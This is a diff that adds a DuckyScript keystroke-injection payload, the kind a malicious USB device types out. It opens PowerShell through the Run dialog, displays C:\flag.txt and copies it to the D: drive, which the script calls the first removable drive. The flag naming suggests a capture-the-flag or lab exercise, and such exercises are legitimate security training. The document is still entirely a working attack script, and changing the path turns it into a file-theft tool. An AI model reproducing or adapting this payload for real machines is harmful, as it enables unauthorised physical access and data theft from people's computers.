@@ -1,1 +1,19 @@
+REM ---------- PowerShell payload: read flag + copy to FIRST removable drive ----------
+DEFAULT_DELAY 100
+DELAY 1500
+
+GUI r
+STRING powershell
+ENTER
+STRING type "C:\flag.txt"
+ENTER
+STRING $src = 'C:\flag.txt'
+ENTER
+STRING $dst = 'D:\flag.txt'
+ENTER
+STRING Copy-Item $src $dst -Force
+ENTER
+STRING exit
+ENTER
+
 
